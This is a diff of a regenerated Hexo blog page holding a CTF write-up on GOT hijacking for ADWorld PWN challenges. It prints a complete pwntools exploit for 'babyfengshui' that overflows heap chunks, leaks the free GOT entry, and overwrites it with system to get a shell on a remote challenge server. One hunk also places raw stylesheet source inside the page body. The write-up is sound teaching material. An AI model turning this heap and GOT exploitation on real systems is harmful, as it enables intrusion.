@@ -18,26 +18,97 @@
 
     <link rel="shortcut icon" href="/img/wang.svg">
     
-<link rel="stylesheet" href="/css/font-awesome.min.css">
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
 
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/img/wang.svg","avatar":"/img/aliwangwang.svg","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Gamer","Learner"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":false},"version":"3.5.2"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
   </script>
 <meta name="generator" content="Hexo 5.4.0"></head>
 
 
 <body>
-<div class="progress-bar-container">
-    
-        <span class="scroll-progress-bar"></span>
-    
+.progress-bar-container {
+  position fixed
+  top 0
+  left 0
+  z-index $z-index-9
+  width 100%
 
-    
-</div>
+  if (hexo-config('pjax.enable') == true) {
 
+    .pjax-progress-bar {
+      position absolute
+      top 0
+      left 0
+      z-index $z-index-8
+      width 0
+      height 2px
+      background var(--pjax-progress-bar-color)
+      visibility hidden
+      opacity 0
+      transition-t("width, opacity", "0, 0", "0.1, 0.1", "linear")
+
+
+      &.show {
+        visibility visible
+        opacity 1
+      }
+    }
+
+
+    .pjax-progress-icon {
+      position absolute
+      top 0.4rem
+      right 0.3rem
+      z-index $z-index-8
+      color var(--text-color-3)
+      font-size 1.1rem
+      visibility hidden
+
+      +keep-tablet() {
+        top 0.3rem
+        right 0.2rem
+        font-size 1rem
+      }
+
+      &.show {
+        visibility visible
+      }
+    }
+  }
+
+  if (hexo-config('style.scroll.progress_bar') == true) {
+
+    .scroll-progress-bar {
+      position absolute
+      top 0
+      left 0
+      z-index $z-index-7
+      width 0
+      height $scroll-progress-bar-height
+      background var(--primary-color)
+      visibility hidden
+      transition-t("width", "0", "0.1", "linear")
+
+      &.hide {
+        display none !important
+      }
+    }
+  }
+}
 
 <main class="page-container">
 
@@ -46,13 +117,18 @@
     <div class="page-main-content">
 
         <div class="page-main-content-top">
-            <header class="header-wrapper">
+            
+<header class="header-wrapper">
 
     <div class="header-content">
         <div class="left">
             
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
             <a class="logo-title" href="/">
-                Relish the Moment
+               Relish the Moment
             </a>
         </div>
 
@@ -162,31 +238,41 @@
 
                 
                     <div class="fade-in-down-animation">
-    <div class="article-content-container">
+    <div class="post-page-container">
+        <div class="article-content-container">
 
-        <div class="article-title">
-            <span class="title-hover-animation">ADWorld PWN Challenge Area Write-ups (GOT Hijacking)</span>
-        </div>
+            <div class="article-title">
+                <span class="title-hover-animation">ADWorld PWN Challenge Area Write-ups (GOT Hijacking)</span>
+            </div>
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/img/aliwangwang.svg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">TyeYeah</span>
-                        
-                            <span class="author-label">Lv4</span>
-                        
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/img/aliwangwang.svg">
                     </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">TyeYeah</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
         <span class="pc">2020-08-29 13:20:11</span>
         <span class="mobile">2020-08-29 13:20</span>
     </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2020-10-26 08:44:44</span>
+    </span>
+    
     
         <span class="article-categories article-meta-item">
             <i class="fas fa-folder"></i>&nbsp;
@@ -221,15 +307,15 @@
                     </li>
                 
                     <li>
+                        | <a href="/tags/got/">got</a>&nbsp;
+                    </li>
+                
+                    <li>
                         | <a href="/tags/heap/">heap</a>&nbsp;
                     </li>
                 
                     <li>
                         | <a href="/tags/uaf/">uaf</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/got/">got</a>&nbsp;
                     </li>
                 
             </ul>
@@ -250,13 +336,13 @@
     
 </div>
 
+                        </div>
                     </div>
                 </div>
-            </div>
-        
+            
 
-        <div class="article-content markdown-body">
-            <p>Challenges here need to hijack <code>GOT</code>.</p>
+            <div class="article-content keep-markdown-body">
+                <p>Challenges here need to hijack <code>GOT</code>.</p>
 <h2 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h2><p>Attachment: <a href="/filehost/apcaw/recho">recho</a><br>Description: None</p>
 <p>A <code>ROP</code> challenge with <code>syscall</code> and other tricks.</p>
 <h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
@@ -350,81 +436,93 @@
 <p>While <code>/lib32/libc.so.6</code> on ubuntu16.04 is also improper, so I choose to use <code>libc6-i386_2.23-0ubuntu10_amd64</code> in the database of <code>LibcSearcher</code>, and it works.</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;57400&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib32/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc6-i386_2.23-0ubuntu10_amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, name, text</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;size of description: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;name: &#x27;</span>,name)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text length: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index, length, text</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text length: &#x27;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;index0&#x27;</span>,<span class="string">&#x27;text0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;index1&#x27;</span>,<span class="string">&#x27;text1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;index2&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;index2&#x27;</span>,<span class="string">&#x27;text2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x91</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x91</span>)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">update(<span class="number">3</span>,<span class="number">0x200</span>,payload)</span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">free_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_addr = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; LibcSearcher takes too long</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;free&#x27;,free_addr)  </span></span><br><span class="line"><span class="string">libc_base = free_addr - libc.dump(&#x27;free&#x27;)  </span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">1</span>,<span class="number">4</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-        </div>
+            </div>
 
-        
+            
 
-        
-            <ul class="post-tags-box">
-                
-                    <li class="tag-item">
-                        <a href="/tags/pwn/">#pwn</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/linux/">#linux</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/stack-overflow/">#stack-overflow</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/ctf/">#ctf</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/heap/">#heap</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/uaf/">#uaf</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/got/">#got</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/pwn/">#pwn</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/linux/">#linux</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/stack-overflow/">#stack-overflow</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/ctf/">#ctf</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/got/">#got</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/heap/">#heap</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/uaf/">#uaf</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
 
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2020/09/20/2020-09-20-ADWorld-PWN-Challenge-Area-Write-ups-Unlink/"
-                        >
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2020/09/20/2020-09-20-ADWorld-PWN-Challenge-Area-Write-ups-Unlink/"
+                            >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
-                            <span class="title flex-center">
+                                <span class="title flex-center">
                                 <span class="post-nav-title-item">ADWorld PWN Challenge Area Write-ups (Unlink)</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2020/08/14/2020-08-14-ADWorld-PWN-Challenge-Area-Write-ups-UAF/"
-                        >
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2020/08/14/2020-08-14-ADWorld-PWN-Challenge-Area-Write-ups-UAF/"
+                            >
                             <span class="title flex-center">
                                 <span class="post-nav-title-item">ADWorld PWN Challenge Area Write-ups (UAF)</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
-                            <span class="right arrow-icon flex-center">
+                                <span class="right arrow-icon flex-center">
                               <i class="fas fa-chevron-right"></i>
                             </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+                            </a>
+                        </div>
+                    
+                </div>
+            
 
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recho"><span class="nav-number">1.</span> <span class="nav-text">Recho</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information"><span class="nav-number">1.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#note-service2"><span class="nav-number">2.</span> <span class="nav-text">note-service2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-1"><span class="nav-number">2.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-1"><span class="nav-number">2.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyfengshui"><span class="nav-number">3.</span> <span class="nav-text">babyfengshui</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-2"><span class="nav-number">3.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-2"><span class="nav-number">3.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-2"><span class="nav-number">3.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
         
     </div>
 </div>
@@ -436,19 +534,23 @@
         </div>
 
         <div class="page-main-content-bottom">
-            <footer class="footer">
+            
+<footer class="footer">
     <div class="info-container">
         <div class="copyright-info info-item">
             &copy;
             
-              <span>2020</span>
-              -
+                <span>2020</span> -
             
-            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
+            2022
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">TyeYeah</a>
+            
         </div>
         
         <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
         </div>
         
         
@@ -464,8 +566,8 @@
     <ul class="tools-list">
         <!-- TOC aside toggle -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
@@ -486,10 +588,6 @@
 
         <li class="tools-item tool-font-adjust-minus flex-center">
             <i class="fas fa-search-minus"></i>
-        </li>
-
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
         </li>
 
         <li class="tools-item tool-dark-light-toggle flex-center">
@@ -521,18 +619,8 @@
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recho"><span class="nav-number">1.</span> <span class="nav-text">Recho</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information"><span class="nav-number">1.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#note-service2"><span class="nav-number">2.</span> <span class="nav-text">note-service2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-1"><span class="nav-number">2.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-1"><span class="nav-number">2.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyfengshui"><span class="nav-number">3.</span> <span class="nav-text">babyfengshui</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-2"><span class="nav-number">3.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-2"><span class="nav-number">3.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-2"><span class="nav-number">3.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
@@ -553,7 +641,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -584,14 +672,12 @@
 
 
 
+
+
     
 <script src="/js/local-search.js"></script>
 
 
-
-
-    
-<script src="/js/code-copy.js"></script>
 
 
 
@@ -600,12 +686,18 @@
 <div class="post-scripts">
     
         
-<script src="/js/left-side-toggle.js"></script>
+<script src="/js/post-helper.js"></script>
 
+        
+            
 <script src="/js/libs/anime.min.js"></script>
 
+        
+        
+            
 <script src="/js/toc.js"></script>
 
+        
     
 </div>
 
